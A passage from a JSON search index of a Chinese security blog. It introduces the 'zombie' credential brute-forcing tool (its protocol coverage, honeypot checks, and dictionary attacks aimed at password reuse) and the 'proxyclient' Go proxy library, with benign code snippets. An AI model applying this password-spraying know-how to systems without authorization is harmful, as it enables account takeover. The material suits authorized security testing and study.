<p>https://github.com/chainreactors/zombie</p> <p>https://chainreactors.github.io/wiki/zombie/</p>"},{"location":"blog/2024/06/07/zombie-introduce/#\u5f00\u6e90\u4e16\u754c","title":"\u5f00\u6e90\u4e16\u754c","text":"<p>\u91cd\u65b0\u8bbe\u8ba1\u4e00\u5957\u5de5\u5177\u4e4b\u524d\u5f97\u5148\u5173\u6ce8\u8fd9\u4e2a\u9886\u57df\u7684\u524d\u8f88\u3002</p> <ul> <li>hydra \u6bcf\u4e2a\u4eba\u90fd\u7528\u8fc7\u7684\u7206\u7834\u5de5\u5177\uff0c\u547d\u4ee4\u884c\u7b80\u5355\u76f4\u767d\u3002\u4f46\u4e5f\u4f1a\u53d1\u73b0\uff0c\u65e5\u7ad9\u8d8a\u719f\u7ec3\u5c31\u7528\u5f97\u8d8a\u5c11\uff0c\u548c\u5b83\u7f16\u8bd1\u9ebb\u70e6\u3001\u6027\u80fd\u8f83\u6162\u3001\u6ca1\u529e\u6cd5\u8de8\u5e73\u53f0\u7b49\u95ee\u9898\u76f8\u5173\u3002\u4e0d\u8fc7\u9605\u8bfb\u5b83\u7684\u6e90\u7801\u4f1a\u53d1\u73b0\uff0c\u5b83\u5bf9\u6bcf\u4e2a\u534f\u8bae\u7684\u652f\u6301\u90fd\u662f\u539f\u751f\u7684\uff0c\u76f4\u63a5\u901a\u8fc7socket\u5b9e\u73b0\uff0c\u800c\u4e0d\u662f\u5f15\u5165\u7b2c\u4e09\u65b9\u5e93\u3002</li> <li>medusa \u548chydra\u975e\u5e38\u76f8\u4f3c\uff0c\u6027\u80fd\u548c\u8bbe\u8ba1\u4e0a\u90fd\u5dee\u4e0d\u591a\uff0c\u7f3a\u70b9\u4e5f\u662f\u7c7b\u4f3c\uff0c\u7f16\u8bd1\u9ebb\u70e6\uff0c\u6027\u80fd\u8f83\u6162\uff0c\u6ca1\u529e\u6cd5\u8de8\u5e73\u53f0\u3002</li> <li>SNETCracker \"\u8d85\u7ea7\u5f31\u53e3\u4ee4\u68c0\u6d4b\u5de5\u5177\"\uff0c\u6709\u4e00\u6bb5\u65f6\u95f4\u8001\u662f\u51fa\u73b0\uff0c\u751a\u81f3\u5728\u76ee\u6807\u7684\u5185\u7f51\u673a\u5668\u4e0a\u90fd\u627e\u5230\u8fc7\u53cb\u5546\u4e0a\u4f20\u7684\u8bb0\u5f55\u3002\u5e26\u6709gui\uff0c\u4e0a\u624b\u5feb\uff0c\u4f46\u6027\u80fd\u5dee\uff0c\u590d\u6742\u573a\u666f\u65e0\u6cd5\u652f\u6301(\u4f8b\u5982\u7ed9\u975e\u9ed8\u8ba4\u53e3\u4ee4\u7684\u670d\u52a1\u7206\u7834\u90fd\u65e0\u6cd5\u505a\u5230)\u3002\u652f\u6301\u7684\u534f\u8bae\u4e5f\u4e0d\u662f\u5f88\u591a\u3002\u5728\u4e00\u4e9b\u6709windows\u76f8\u5173\u534f\u8bae\u4e0a\u652f\u6301\u6bd4\u8f83\u597d\uff0c\u5982rdp\u3002</li> <li>legba \u4e00\u4e2a\u7528rust\u7f16\u5199\u7684\u8f83\u65b0\u7684\u7206\u7834\u5de5\u5177\uff0c\u6211\u7b2c\u4e00\u773c\u770b\u5230\u5b83\u7684\u65f6\u5019\u4e00\u5ea6\u89c9\u5f97zombie\u9879\u76ee\u53ef\u4ee5\u505c\u6b62\u4e86\u3002\u4f46\u5b9e\u9645\u4f7f\u7528\u4e86\u4e00\u6b21\uff0c\u53d1\u73b0hydra\u6709\u7684\u95ee\u9898\u5b83\u7adf\u7136\u5b8c\u7f8e\u5730\u4fdd\u7559\u4e86\uff0c\u9664\u4e86rust\u7684tokio\u63d0\u4f9b\u4e86\u66f4\u5f3a\u5927\u7684\u591a\u7ebf\u7a0b\u6027\u80fd\u5916\uff0c\u4f9d\u65e7\u662f\u65e0\u6cd5\u8de8\u5e73\u53f0\uff0c\u7f16\u8bd1\u9ebb\u70e6\u4e4b\u7c7b\u7684\u95ee\u9898\uff0c\u652f\u6301\u7684\u534f\u8bae\u4e5f\u6ca1\u90a3\u4e48\u591a\u3002\u53cd\u800c\u8ba9\u6211\u66f4\u8feb\u5207\u5730\u5b8c\u6210zombie\u9879\u76ee\u3002</li> <li>\u5176\u4ed6\uff0c\u8fd9\u4e24\u5e74\u4e5f\u51fa\u73b0\u4e86fscan\u3001kscan\u7b49\u7b49\u5e26\u6709\u7206\u7834\u529f\u80fd\u7684\u626b\u63cf\u5668\uff0c\u4f46\u4e0d\u77e5\u9053\u6709\u6ca1\u6709\u4eba\u53d1\u73b0\uff0c\u4f7f\u7528fscan\u7684\u65f6\u5019\u4ece\u6765\u6ca1\u626b\u63cf\u5230\u8fc7\u975e\u9ed8\u8ba4\u7aef\u53e3\u7684\u5f31\u53e3\u4ee4(\ud83d\ude0a)\uff0c\u56e0\u4e3afscan\u786c\u7f16\u7801\u4e86\u7aef\u53e3\u53f7\uff0c\u5e76\u6839\u636e\u7aef\u53e3\u53f7\u8fdb\u884c\u7206\u7834\u3002\u8bf8\u5982\u6b64\u7c7b\u95ee\u9898\uff0c\u4ed6\u4eec\u7684\u7206\u7834\u80fd\u529b\u5bf9\u6bd4hydra\u6765\u8bf4\u53cd\u800c\u662f\u9000\u6b65\u4e86\u3002</li> </ul> <p>\u4ece\u5f00\u6e90\u4e16\u754c\u6765\u770b\uff0c\u5176\u5b9e\u6025\u7f3a\u8fd9\u4e48\u4e00\u6b3e\u5de5\u5177\u3002\u4ecezombie\u7684\u7b2c\u4e00\u884c\u4ee3\u7801\u5230public\u8fc7\u4e86\u4e24\u5e74\uff0c\u4f46\u9664\u4e86legba\u7565\u5fae\u6709\u4e9b\u65b0\u610f\u4e4b\u5916\uff0c\u5e76\u65e0\u6539\u53d8\u3002</p>"},{"location":"blog/2024/06/07/zombie-introduce/#\u8bbe\u8ba1\u76ee\u6807","title":"\u8bbe\u8ba1\u76ee\u6807","text":"<p>Zombie\u7684\u8bbe\u8ba1\u4e4b\u521d\u6709\u51e0\u4e2a\u76ee\u6807\uff1a</p> <ol> <li>\u7b80\u6d01\u7684\u547d\u4ee4\u884c\u8bbe\u8ba1\uff0c\u53c2\u8003\u4e86hydra\u7684\u547d\u4ee4\u884c\u8bbe\u8ba1\u3002</li> <li>\u652f\u6301\u8db3\u591f\u591a\u7684\u670d\u52a1\uff0c\u5305\u62ec\u5404\u79cdweb\u670d\u52a1\uff0c\u76ee\u524d\u5df2\u7ecf\u652f\u6301\u4e86\u6570\u5341\u4e2a\u670d\u52a1\u3002(\u901a\u8fc7\u539f\u751f\u63d2\u4ef6\u4e0eneutron\u5f15\u64ce\u5b9e\u73b0\u4e86)</li> <li>\u8054\u52a8gogo\u3002gogo\u4e3a\u4e86\u8f7b\u91cf\u4e14\u65e0\u4f9d\u8d56\u653e\u5f03\u4e86\u5f88\u591a\u529f\u80fd\uff0c\u901a\u8fc7zombie\u8865\u5168gogo\u7684\u77ed\u677f\u3002</li> <li>\u6279\u5904\u7406\uff0c\u4e0d\u53ea\u662f\u62ff\u4e00\u4e2a\u5bc6\u7801\u7206\u7834\u76f8\u5173\u670d\u52a1\uff0c\u800c\u662f\u62ff\u7206\u7834\u53ef\u7206\u7834\u7684\u4e00\u5207\u3002</li> <li>\u652f\u6301\u52a8\u6001\u751f\u6210\u5b57\u5178\uff0c\u91cd\u5199\u4e86hashcat\u7684rule\u4e0emask\u751f\u6210\u5668\u3002</li> <li>\u652f\u6301\u4e00\u5b9a\u7684\u540e\u6e17\u900f\u80fd\u529b (\u7c7b\u4f3ccrackmapexec\uff0c\u76ee\u524d\u8fd8\u672a\u5b9e\u73b0)\u3002</li> </ol> <p>\u5728\u51ed\u8bc1\u7206\u7834\u8fd9\u4e2a\u573a\u666f\uff0czombie\u5e0c\u671b\u80fd\u89e3\u51b3\u6240\u6709\u95ee\u9898\u3002\u4e0d\u4ec5\u4ec5\u662f\u5c3d\u53ef\u80fd\u5168\u7684\u534f\u8bae\u9002\u914d\uff0c\u540c\u65f6\u8fd8\u8981\u89e3\u51b3\u81ea\u52a8\u5316\u4e0e\u5b57\u5178\u95ee\u9898\u3002</p>"},{"location":"blog/2024/06/07/zombie-introduce/#\u4ecb\u7ecd","title":"\u4ecb\u7ecd","text":""},{"location":"blog/2024/06/07/zombie-introduce/#\u534f\u8bae\u8986\u76d6\u9762","title":"\u534f\u8bae\u8986\u76d6\u9762","text":"<p>\u73b0\u5728\u7684zombie\uff08\u622a\u81f3v1.1.6\uff09\uff0c\u652f\u630139\u79cdtemplate\u914d\u7f6e\u7684\u670d\u52a1\uff0c27\u79cdgo\u539f\u751f\u63d2\u4ef6\u5b9e\u73b0\u7684\u670d\u52a1\u3002\u5149\u4ece\u534f\u8bae\u652f\u6301\u6765\u6bd4\u8f83\uff0c\u5df2\u7ecf\u662f\u5730\u8868\u6700\u5168\u9762\u7684\u7206\u7834\u5de5\u5177\uff08\u90e8\u5206\u534f\u8bae\u7f3a\u5c11\u6d4b\u8bd5\uff09\u3002</p> <p></p> <p>\u5f53\u524d\u8fd966\u79cd\u534f\u8bae\u53ea\u662f\u4e2a\u5f00\u59cb\uff0c\u7406\u8bba\u4e0a\u9700\u8981\u8986\u76d6\u6240\u6709\u53ef\u7206\u7834\u7684\u653b\u51fb\u9762\u3002\u4e5f\u5c06\u662f\u89e3\u51b3\u5bc6\u7801\u590d\u7528\u95ee\u9898\u7684\u7ec8\u6781\u89e3\u51b3\u65b9\u6848\u3002</p>"},{"location":"blog/2024/06/07/zombie-introduce/#\u5bc6\u7801\u590d\u7528\u7684\u6740\u624b","title":"\u5bc6\u7801\u590d\u7528\u7684\u6740\u624b","text":"<p>\u4e0b\u56fe\u4e3a\u6d4b\u8bd5\u73af\u5883\u4e2d\u7b80\u5355\u914d\u7f6e\u6d4b\u8bd5</p> <p></p> <p>\u5c3d\u53ef\u80fd\u5168\u7684\u534f\u8bae\u8986\u76d6\u5e76\u4e0d\u662fzombie\u7684\u7ec8\u6781\u76ee\u6807\u3002</p> <p>\u7532\u65b9\u62ff\u7740\u5f00\u6e90\u6216\u8005\u5546\u4e1a\u5316\u7684\u626b\u63cf\u5668\u626b\u4e86\u4e00\u904d\u53c8\u4e00\u904d\uff0c\u4f46\u662f\u653b\u9632\u4e00\u6253\uff0c\u603b\u6709\u90a3\u4e48\u4e00\u4e2a\u901a\u7528\u53e3\u4ee4\uff0c\u80fd\u6253\u6b7b\u4e00\u7247\u76f4\u63a5\u88ab\u5237\u51fa\u5c40\u3002</p> <p>\u626b\u63cf\u5668\u53ea\u80fd\u626b\u5f31\u53e3\u4ee4\uff0c\u4e0d\u80fd\u89e3\u51b3\u53e3\u4ee4\u590d\u7528</p> <p>\u5546\u4e1a\u5316\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u4f8b\u59821password\u8fd9\u7c7b\u5bc6\u7801\u7ba1\u7406\u5668\u6216bitwarden\u8fd9\u6837\u7684\u56e2\u961f\u5bc6\u94a5\u7ba1\u7406\u5de5\u5177\u3002\u53c8\u6216\u662fnacos\uff0capollo\u8fd9\u7c7b\u914d\u7f6e\u4e2d\u5fc3\uff08\u6709\u4e9b\u4eba\u4f1a\u62ff\u4ed6\u4eec\u5f53\u5bc6\u7801\u7ba1\u7406\u5668\uff09\u3002\u89e3\u51b3\u7684\u662f\u5bc6\u7801\u5982\u4f55\u7ba1\u7406\u7684\u95ee\u9898\uff0c\u5c31\u7b97\u52a0\u4e86\u968f\u673a\u751f\u6210\u5bc6\u7801\u7684\u529f\u80fd\uff0c\u4e5f\u4e0d\u80fd\u4fdd\u8bc1\u7528\u6237\u6bcf\u6b21\u90fd\u4f1a\u4f7f\u7528\u3002\u603b\u6709\u4eba\u8d2a\u56fe\u65b9\u4fbf\u5c06\u7528\u4e00\u4e2a\u901a\u7528\u5bc6\u7801\u4f5c\u4e3a\u6240\u6709\u4e1a\u52a1\u7684\u5bc6\u7801\u3002</p> <p>\u8fd8\u6709\u53e6\u5916\u4e00\u7c7b\u5546\u4e1a\u5316\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u5982\u5821\u5792\u673a/\u8fd0\u7ef4\u673a/\u4e91\u7ba1\uff0c\u540c\u6837\u89e3\u51b3\u4e0d\u4e86\u8fd9\u4e2a\u95ee\u9898\u3002\u7b2c\u4e00\u4e2a\u95ee\u9898\u5982\u5df2\u6709\u670d\u52a1\u52a0\u5230\u5821\u5792\u673a\u65f6\uff0c\u6781\u5c11\u4f1a\u4fee\u6539\u4e00\u6b21\u5bc6\u7801\uff0c\u6240\u4ee5\u4f9d\u65e7\u7ecf\u5e38\u80fd\u770b\u5230\u4e00\u4e2a\u79c1\u94a5/\u5bc6\u7801\u6253\u6b7b\u4e00\u5927\u7247\u7684\u60c5\u51b5\u3002\u5176\u6b21\u5c06root\u7528\u6237\u52a0\u5230\u5821\u5792\u673a\u4e2d\uff0c\u4e0d\u4ee3\u8868\u8fd9\u4e2a\u670d\u52a1\u53ea\u6709\u8fd9\u4e00\u4e2a\u7528\u6237\uff0c\u4e3a\u4e86\u8fd0\u7ef4\u65b9\u4fbf\uff0c\u7528\u6237\u53ef\u80fd\u4f1a\u6dfb\u52a0\u5176\u4ed6\u8fd0\u7ef4\u7528\u6237\uff0c\u4f8b\u5982zabbix\uff0cansible\u7b49\u7b49\u3002</p> <p>\u800czombie\u5c31\u662f\u5bc6\u7801\u590d\u7528\u7684\u6740\u624b\uff0c\u53ea\u9700\u8981\u63a5\u6536gogo\u7684\u626b\u63cf\u7ed3\u679c\uff08\u4e5f\u652f\u6301\u7528\u6237\u81ea\u5b9a\u4e49\u751f\u6210\u7684json\u6587\u4ef6\uff09\uff0czombie\u5c31\u80fd\u4ecegogo\u7684\u6307\u7eb9\u4e2d\u9009\u53d6\u5408\u9002\u7684\u670d\u52a1\uff0c\u62ff\u7740\u5bc6\u7801\u672c\u5bf9\u6240\u6709\u670d\u52a1\u8fdb\u884c\u4e00\u6b21\u6d4b\u8bd5\u3002</p> <p>\u4e0d\u5c11\u5de5\u5177\u6216\u591a\u6216\u5c11\u7684\u652f\u6301\u914d\u7f6e\u901a\u7528\u5bc6\u7801\u672c\uff0c\u4f46\u5fc5\u5b9a\u4e0d\u5982\u5c06\u8fd9\u4e2a\u52a0\u5230\u8bbe\u8ba1\u7406\u5ff5\u4e2d\u7684zombie\u3002</p>"},{"location":"blog/2024/06/07/zombie-introduce/#\u56f0\u96be","title":"\u56f0\u96be","text":"<p>zombie\u9047\u5230\u7684\u8bb8\u591a\u56f0\u96be\u76ee\u524d\u4e5f\u6ca1\u8f83\u597d\u7684\u89e3\u51b3\u529e\u6cd5\u3002</p> <p>\u871c\u7f50\u4e0e\u672a\u6388\u6743\u7684\u533a\u5206</p> <p>zombie\u7684\u626b\u63cf\u903b\u8f91:</p> <ol> <li>\u968f\u673a\u8d26\u6237\u5bc6\u7801\u7684check-honeypot\u6d4b\u8bd5\uff0c\u7528\u6765\u68c0\u6d4b\u662f\u5426\u4e3a\u871c\u7f50</li> <li>\u6307\u5b9a\u9ed8\u8ba4\u8d26\u6237\u3001\u9ed8\u8ba4\u5bc6\u7801(\u90e8\u5206\u60c5\u51b5\u4e0b\u4e3a\u7a7a)\u7684\u672a\u6388\u6743/\u9ed8\u8ba4\u5bc6\u7801\u6d4b\u8bd5\uff0c\u68c0\u6d4b\u662f\u5426\u662f\u7a7a\u5bc6\u94a5</li> <li>\u6839\u636e\u5b57\u5178\u5f00\u59cb\u7206\u7834</li> </ol> <p>\u4f46\u5982ftp\u3001mysql\uff0c\u5982\u679c\u5bc6\u7801\u4e3a\u7a7a\uff0c\u5219\u4efb\u610f\u5bc6\u7801\u90fd\u80fd\u767b\u5f55\u3002\u56e0\u6b64\u65e0\u6cd5\u533a\u5206\u662f\u871c\u7f50\u6216\u662f\u672a\u6388\u6743\u3002</p> <p>\u517c\u5bb9\u6027</p> <p>\u6709\u591a\u4e2a\u5e93\u5df2\u7ecf\u65e0\u6cd5\u5728go1.10\u4e0a\u7f16\u8bd1\uff0c\u4e5f\u5c31\u662f\u8bf4zombie\u65e0\u6cd5\u8fd0\u884c\u5728windows xp/windows server 2003\u4e0a\u3002</p> <p>\u66f4\u5927\u7684\u56f0\u96be\u8fd8\u6709\u540c\u4e00\u4e2a\u670d\u52a1\u652f\u6301\u591a\u79cd\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u751a\u81f3\u4e0d\u540c\u7248\u672c\u4e5f\u9700\u8981\u4e0d\u540c\u7684\u8ba4\u8bc1\u65b9\u5f0f\u3002</p> <ul> <li>rdp\u3001smb\u8fd9\u7c7bwindows\u534f\u8bae\uff0c\u652f\u6301\u7684\u8ba4\u8bc1\u65b9\u5f0f\u7279\u522b\u591a\uff0c\u4f46\u56e0\u80fd\u529b\u6709\u9650\uff0c\u53ea\u80fd\u652f\u6301\u6700\u5e38\u7528\u7684\u3002\u5e76\u4e14\u8fd8\u4f1a\u56e0\u4e3a\u534f\u8bae\u7248\u672c\u7684\u4e0d\u540c\uff0c\u51fa\u73b0\u5927\u91cf\u6f0f\u62a5\u3001\u8bef\u62a5\u95ee\u9898\u3002\u9700\u8981\u66f4\u591a\u7684\u53cd\u9988\u4fee\u590d\u3002</li> <li>oracle\u3001postgre\u3001mongo\u534f\u8bae\u652f\u6301\u591a\u79cd\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u4e5f\u6682\u65f6\u6ca1\u6709\u80fd\u529b\u4e00\u4e00\u9002\u914d\u3002</li> <li>telnet\u3001http\u534f\u8bae\u4f1a\u56e0\u4e3a\u6bcf\u4e2a\u670d\u52a1\u7684\u5b9e\u73b0\u65b9\u5f0f\u4e0d\u540c\uff0c\u90fd\u9700\u8981\u4e00\u4e00\u624b\u52a8\u9002\u914d\u3002</li> </ul> <p>\u8fd9\u4e9b\u56f0\u96be\u53ef\u80fd\u4f1a\u9700\u8981\u5411\u793e\u533a\u6c42\u52a9\u624d\u6709\u53ef\u80fd\u4e00\u4e00\u89e3\u51b3\u3002</p> <p>\u672a\u6765\u8fd8\u5c06\u9762\u4e34\u66f4\u590d\u6742\u7684\u573a\u666f\u3002</p> <p>\u5728\u6211\u7684\u8bbe\u60f3\u4e2d\uff0czombie\u5e94\u8be5\u8981\u5982crackexecmap\u90a3\u6837\uff0c\u6279\u91cf\u8fdb\u884c\u5229\u7528\u3002\u5982\u6b64\u591a\u7684\u534f\u8bae\u5c06\u8fd9\u4e2a\u9700\u6c42\u7684\u56f0\u96be\u653e\u5927\u4e86\u65e0\u6570\u500d\u3002\u76ee\u524d\u770b\u6765\u8fd8\u6ca1\u6709\u5f88\u597d\u7684\u89e3\u51b3\u529e\u6cd5\uff0c\u53ea\u80fd\u7b49\u5f85\u5de5\u5177\u94fe\u7684\u8fdb\u4e00\u6b65\u6210\u719f\uff0c\u624d\u80fd\u5bf9\u8fd9\u6837\u590d\u6742\u7684\u9700\u6c42\u8fdb\u884c\u9002\u914d\u3002</p> <p>\u5f00\u6e90\u4e16\u754c\u7f3a\u5c11\u6210\u719f\u7684exploit\u6846\u67b6\uff0c\u8fde\u5546\u4e1a\u5316\u4ea7\u54c1\u4e5f\u53ea\u80fd\u901a\u8fc7\u5806\u4eba\u529b\u7684\u65b9\u5f0f\u5b9e\u73b0\u4e00\u4e2a\u4e00\u4e2a\u6f0f\u6d1e\u7684\u517c\u5bb9\u3002\u5176\u5b9e\u7edd\u5927\u90e8\u5206\u5de5\u4f5c\u90fd\u5728\u91cd\u590d\u9020\u8f6e\u5b50\uff0c\u4e5f\u8ba9zombie\u65e0\u6cd5\u5c06\u5176\u626b\u63cf\u7ed3\u679c\u4f20\u9012\u5230\u4e0b\u4e00\u73af\u3002</p>"},{"location":"blog/2024/06/07/zombie-introduce/#end","title":"End","text":"<p>\u4e4b\u524d\u5728\u5199gogo\u65f6, \u5b9e\u73b0\u4e86\u4e00\u4e2a\u65e0\u4f9d\u8d56\u7684nuclei template\u7684nano\u7248\u672c\u89e3\u6790\u5f15\u64ceneutron, zombie\u5f97\u4ee5\u4e0d\u9700\u8981\u91cd\u65b0\u9020\u8f6e\u5b50, \u76f4\u63a5\u590d\u7528\u7684\u4e86gogo\u7684\u6210\u679c. \u4e5f\u4ecenuclei-template\u96c6\u6210\u5927\u91cfdefault-login\u76f8\u5173\u7684poc, \u7b80\u5355\u79fb\u690d\u4e4b\u540e, \u8fd9\u4e9bpoc\u7684\u80fd\u529b\u90fd\u5f97\u5230\u7684\u589e\u5f3a, \u4e0d\u518d\u662f\u53ea\u80fd\u7206\u7834\u9ed8\u8ba4\u5bc6\u7801.  \u611f\u8c22projectdiscovery\u7684\u5de5\u4f5c, \u6807\u51c6\u5316\u7684poc\u751f\u6001, \u80fd\u8ba9\u540e\u4eba\u51cf\u5c11\u5927\u91cf\u7684\u91cd\u590d\u5de5\u4f5c.  zombie\u7684\u539f\u751f\u63d2\u4ef6\u4e5f\u5c06\u53cd\u54faprojectdiscovery\u5de5\u5177\u94fe\u65e0\u6cd5\u5b9e\u73b0\u7684\u5927\u91cf\u670d\u52a1\u7684\u7206\u7834\u529f\u80fd.</p> <p>zombie\u662f\u4e00\u4e2a\u8df5\u884c\u4e86chainreactors(\u94fe\u5f0f\u53cd\u5e94\u5668)\u8bbe\u8ba1\u7406\u5ff5\u7684\u5de5\u4ef6. \u5728\u6700\u8fd1\u7684\u4e00\u4e9b\u53cd\u9988\u4e0e\u6d4b\u8bd5\u4e2d\u4e5f\u53d6\u5f97\u4e86\u6781\u597d\u7684\u6548\u679c.  \u6b22\u8fce\u5404\u4f4d\u4f53\u9a8c,\u63d0\u4f9b\u53cd\u9988.</p> <p>\u5230\u5927\u6d3b\u52a8\u5f00\u59cb\u524d, \u8fd8\u4f1a\u53d1\u5e03gogo\u4ece\u53d1\u5e03\u4ee5\u6765\u7684\u589e\u5f3a\u4ecb\u7ecd, \u4e0espray\u76841.0\u7248\u672c</p>"},{"location":"blog/2025/02/14/proxyclient-introduce/","title":"\u62d3\u5c55golang\u4ee3\u7406\u7684\u8fb9\u754c proxyclient","text":""},{"location":"blog/2025/02/14/proxyclient-introduce/#\u524d\u8a00","title":"\u524d\u8a00","text":"<p>\u672c\u6587\u662frem\u53d1\u5e03\u524d\u7684\u524d\u83dc\uff0c \u662f\u5728\u5b9e\u73b0rem\u8fc7\u7a0b\u4e2d\u7684\u9644\u5e26\u4ea7\u7269\uff0c\u4f46\u56e0\u5176\u53ef\u4ee5\u88ab\u4f7f\u7528\u5728\u5927\u91cf\u5176\u4ed6\u7ec4\u4ef6\u4e2d\uff0c \u6545\u5c06\u5176\u62bd\u8c61\u51fa\u6765\u4f5c\u4e3a\u72ec\u7acb\u7684\u5e93\u4f7f\u7528\u3002 </p> <p>TLNR:</p> <p>repo: https://github.com/chainreactors/proxyclient</p> <p>wiki: https://chainreactors.github.io/wiki/libs/proxyclient/</p>"},{"location":"blog/2025/02/14/proxyclient-introduce/#golang-\u4ee3\u7406\u7684\u80cc\u666f\u77e5\u8bc6","title":"golang \u4ee3\u7406\u7684\u80cc\u666f\u77e5\u8bc6","text":"<p>\u4f17\u6240\u5468\u77e5\uff0c golang\u4e0a\u6709\u7740\u8fdc\u8d85\u5176\u4ed6\u4efb\u610f\u8bed\u8a00\u7684\u7f51\u7edc\u76f8\u5173\u7684\u751f\u6001\u5e93\u3002 \u5404\u79cd\u5e94\u7528\u4e5f\u5c42\u51fa\u4e0d\u7a77\uff0c\u4ece\u5b89\u5168\u9886\u57df\u5e38\u7528\u7684iox,frp,nps \u5230\u7f51\u7edc\u4ee3\u7406gost, xray, v2ray\uff0c \u4ee5\u53ca\u76f8\u5bf9\u5e95\u5c42\u7684\u7f51\u7edc\u534f\u8bae\u5b9e\u73b0\u5e93\u5982kcp,quic, rawpacket, \u8fd8\u6709\u6700\u91cd\u8981\u7684\u6807\u51c6\u5e93\u63d0\u4f9b\u7684\u5bc6\u7801\u5b66\u5e93(crypto\u548ctls)\u53ca\u5176\u4f18\u96c5\u7684\u62bd\u8c61\u3002 </p> <p>\u8d8a\u6765\u8d8a\u591a\u7684\u626b\u63cf\u5668\u4e5f\u90fd\u57fa\u4e8egolang\u5b9e\u73b0\uff0c\u8fd9\u4e5f\u5305\u62ec\u4e86\u6211\u5728\u591a\u5e74\u524d\u7f16\u5199\u7684\u626b\u63cf\u5668gogo\u3002 \u5728gogo\u5f00\u53d1\u7684\u65e9\u671f\u6211\u5bf9\u4f7f\u7528\u4ee3\u7406\u53bb\u626b\u63cf\u662f\u6709\u504f\u89c1\u7684\uff0c\u8fd9\u6e90\u4e8e\u6211\u5bf9\u7f51\u7edc\u534f\u8bae\u548cgolang\u8bbe\u8ba1\u4e0a\u7684\u4e86\u89e3\u4e0d\u591f\u6df1\u5165\uff0c\u8fd8\u6709\u4e00\u4e2a\u91cd\u8981\u539f\u56e0\u662f\u6807\u51c6\u5e93\u5e93\u4e2d\u7684proxy\u63d0\u4f9b\u4e86\u5f88\u597d\u7684\u62bd\u8c61\uff0c \u4f46\u662f\u5728\u5177\u4f53\u5b9e\u73b0\u4e0a\u7565\u663e\u6df7\u4e71\u3002 \u8fd9\u4e5f\u5bfc\u81f4\u4e86\u5f88\u957f\u4e00\u6bb5\u65f6\u95f4gogo\u7684\u4ee3\u7406\u626b\u63cf\u5b9e\u9645\u4e0a\u662f\u8bef\u7528\u4e86\uff0c\u8ba9\u6211\u4e00\u76f4\u4ee5\u4e3a\u53ea\u6709socks5\u534f\u8bae\u80fd\u4ee3\u7406socket\u3002</p> <p></p> <p>\u5f53\u7136\u8fd9\u4e2a\u8bef\u533a\u4e0d\u6b62\u5b58\u5728\u4e8egogo\u4e0a\uff0c \u6211\u53ef\u4ee5\u5ba3\u5e03\uff0c\u76ee\u524d\u6240\u6709\u7684\u626b\u63cf\u5668\u90fd\u6ca1\u6709\u5b8c\u5168\u53d1\u6325\u4ee3\u7406\u7684\u529f\u80fd\u3002</p> <p>\u5982\u679c\u641c\u7d22\u7f51\u4e0a\u7684\u6587\u7ae0\uff0c \u6700\u5e38\u89c1\u914d\u7f6e\u4ee3\u7406\u7684\u65b9\u5f0f\u662f\u8fd9\u6837\uff1a <pre><code>func main() {\n\u00a0\u00a0\u00a0\u00a0proxyUrl, _ := url.Parse(\"http://127.0.0.1:8080\")\n\u00a0\u00a0\u00a0\u00a0client := &amp;http.Client{\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Transport: &amp;http.Transport{\n    \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Proxy: http.ProxyURL(proxyUrl),\n    \u00a0\u00a0\u00a0\u00a0},\n\u00a0\u00a0\u00a0\u00a0}\n\u00a0\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a0\u00a0resp, err := client.Get(\"http://example.com\")\n\u00a0\u00a0\u00a0\u00a0if err != nil {\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0panic(err)\n\u00a0\u00a0\u00a0\u00a0}\n}\n</code></pre></p> <p>\u5982\u679c\u4f60\u662f\u8fd9\u6837\u4f7f\u7528golang\u4ee3\u7406\uff0c\u8bf4\u660e\u4f60\u4e5f\u88ab\u590d\u5236\u6765\u590d\u5236\u53bb\u7684\u6587\u7ae0\u8bef\u5bfc\u4e86\u3002 </p> <p>\u76f8\u5bf9\u6b63\u786e\u7684\u7528\u6cd5\u5e94\u8be5\u662f\u8fd9\u6837, \u53ea\u8981\u5b9e\u73b0\u4e86Dial\u63a5\u53e3\uff0c \u4efb\u610f\u6570\u636e\u4ea4\u6362\u90fd\u80fd\u4f5c\u4e3a\u4ee3\u7406\u4fe1\u9053\u3002 </p> <pre><code>func main() {\n    proxyURL, _ := url.Parse(\"socks5://127.0.0.1:1080\")\n    dialer, _ := proxy.FromURL(proxyURL, proxy.Direct)\n\n    transport := &amp;http.Transport{\n        Dial: dialer.Dial,\n    }\n    client := &amp;http.Client{Transport: transport}\n\n    resp, _ := client.Get(\"https://example.com\")\n    defer resp.Body.Close()\n}\n</code></pre> <p>\u8ddf\u8e2a\u5230proxy.FromURL</p> <pre><code>switch u.Scheme {  \ncase \"socks5\", \"socks5h\":  \n    addr := u.Hostname()  \n    port := u.Port()  \n    if port == \"\" {  \n       port = \"1080\"  \n    }  \n    return SOCKS5(\"tcp\", net.JoinHostPort(addr, port), auth, forward)  \n}\n</code></pre> <p>\u4f46golang\u5b98\u65b9\u53ea\u5b9e\u73b0\u4e86socks5\u534f\u8bae\uff0c\u56e0\u6b64\u8fd9\u4e5f\u4e0d\u80fd\u5b8c\u5168\u602a\u6211\u5bf9\u5176\u7684\u8bef\u89e3\u3002 </p> <p>\u60f3\u652f\u6301socks5\uff0csocks4\uff0csocks4a, http, https\uff0c\u751a\u81f3shadowsocks, trojan, ssh\u3002 \u66f4\u751a\u81f3neoreg\uff0csuo5\u8fd9\u4e9b\u534f\u8bae\u4f5c\u4e3aproxyclient. \u90a3\u5e94\u8be5\u600e\u4e48\u505a?</p>"},{"location":"blog/2025/02/14/proxyclient-introduce/#\u5b9e\u73b0","title":"\u5b9e\u73b0","text":"<p>\u6211\u5728\u51fa\u73b0\u8fd9\u4e2a\u9700\u6c42\u7684\u65f6\u5019\uff0c\u641c\u4e86\u4e0b\u662f\u5426\u6709\u8fd9\u6837\u7684\u5e93. \u7b54\u6848\u662f\u6709\u7684</p> <p>\u6700\u65e9\u5b9e\u73b0\u8fd9\u4e2a\u9700\u6c42\u7684\u5e93\u662f https://github.com/zhuhaow/ProxyClient  \u4f46\u662f\u4e0d\u5f97\u4e0d\u8bf4\uff0c\u4ee3\u7801\u8d28\u91cf\u548c\u98ce\u683c\u90fd\u4e0d\u662f\u7279\u522b\u4f18\u96c5\u3002 </p> 